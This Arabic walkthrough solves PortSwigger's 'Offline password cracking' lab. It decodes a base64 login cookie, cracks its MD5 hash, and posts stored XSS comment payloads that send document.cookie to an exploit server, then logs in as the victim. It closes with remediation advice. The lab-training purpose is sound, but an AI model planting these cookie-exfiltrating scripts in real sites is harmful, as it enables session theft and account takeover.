# [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

## **`الهدف`**
الدخول إلى حساب `carlos` وحذف حسابه من صفحة `My account`.
## **`خطوات الحل`**
==**`ملاحظة:`==** لحل هذا اللاب سنحتاج إلى استعمال ثغرة `XSS`.

سنقوم أولًا بتسجيل الدخول إلى حساب `wiener:peter` وتفعيل خيار `Stay logged in` واعتراض الـ `request` الثاني الذي يحدث تلقائيًا.
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4a00b104e5404a805d120a00e000a7.web-security-academy.net
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=vsbDXKMhKbWYdTVsr6xnoawZ3uDjSa5E
```

ونقوم بنسخ الكود المكتوب بجانب `stay-logged-in=` وهو `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

ونتوجه إلى `Burp Decoder` ونقوم بعمل `Decode` لهذا الكود بترميز `Base64` لنجد أن النتيجة هي `wiener:51dc30ddc473d43a6011e9ebba6ca770`

ونقوم بنسخ الجزء الثاني المشفر وبما أن الهاش لا يمكن فك تشفيره فهناك بعض الأدوات والمواقع التى تقوم بعمل مقارنة لناتج الهاش مقارنة بالكلمات الشهيرة مثل موقع **[crackstation](https://crackstation.net/)** وبمجرد وضع الكود بها `51dc30ddc473d43a6011e9ebba6ca770`.

سنجد ان النتيجة هي أن نوع التشفير هو `MD5` بالإضافة إلى أن الكلمة المشفرة هي `peter` وهي كلمة المرور الخاصة بنا .

بعد ذلك سنقوم بالضغط على `Go to exploit server` وننقوم بنسخ الـ `Url` وهو `https://exploit-0a6400de04fd407e80a1112c01d2008b.exploit-server.net/exploit`

ونقوم بالتوجه إلى أى موضوع مكتوب على اللاب ونضع تعليق به هذا الكود
```JS
<script>

fetch('https://exploit-0a6400de04fd407e80a1112c01d2008b.exploit-server.net/?cookie=' + document.cookie);

</script>
```

أو هذا الكود الذي استعمله الـ `PortSwigger` في الحل الرسمي
```JS
<script>document.location='//exploit-0a6400de04fd407e80a1112c01d2008b.exploit-server.net/'+document.cookie</script>
```

وبعد ذلك نتوجه مرة أخرى إلى السيرفر بالضغط على `Go to exploit server` ونضغط على `Acces log` لنجد كلامًا يُشبه التالي:
```cookie
10.0.4.64       2026-07-01 20:29:20 +0000 "GET /exploit?cookie=secret=075v2ZCxSlWWuENQrOgpEzVqJHhNkfP7;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

وسنلاحظ وجود كود `stay-logged-in` الخاص بحساب `carlos` وهو `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` وبإعادة تكرار نفس الخطوات التي فعلناها مع كود حساب `wiener` سنعرف أن المكتوب هو `carlos:onceuponatime` فنقوم بتسجيل الخروج، ومن ثم الدخول لحساب `carlos` والضغط على `Delete account` وستظهر صفحة أخرى تطلب إدخال كلمة المرور لتأكيد الحذف فنقوم بكتابتها مرة أخرى `onceuponatime` ونضغط على `Delete account!` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء من ترقيع لاب` [Brute-forcing a stay-logged-in cookie](./Brute-forcing-a-stay-logged-in-cookie.md)

فبما أن الهدف هنا هو مجرد عرض محتوى التعليق `Comment` للمستخدمين في واجهة المستخدم `Frontend`، فيجب على المبرمجين الاعتماد على خصائص آمنة مثل `textContent` أو `innerText` والتي تتعامل مع المدخلات كنص عادي `Plain Text` فقط، وتمنع تفعيل أي وسم `Tag` خبيث يتم حقنه مثل `<script>` أو `<img>`.

وإذا كان الموقع يسمح بتنسيق النصوص مثل `Rich Text/HTML comments` فيجب استخدام مكتبة تنقيح موثوقة لتنظيف المدخلات بالاعتماد على قائمة بيضاء `Whitelist` وإزالة أي وسم `Tag` خبيث أو غير مصرح به قبل حفظه في قاعدة البيانات.

ويجب إعداد ترويسة `Content-Security-Policy` في الـ `Response` الخاص بالسيرفر، لإجبار المتصفح على عدم تنفيذ أي أكواد `JavaScript` مكتوبة مباشرة داخل الصفحة `Inline Scripts`، وبالتالي تمنع إرسال بيانات المستخدم إلى نطاقات `Domains` غير موثوقة (مثل سيرفر المهاجم `exploit-server.net`).
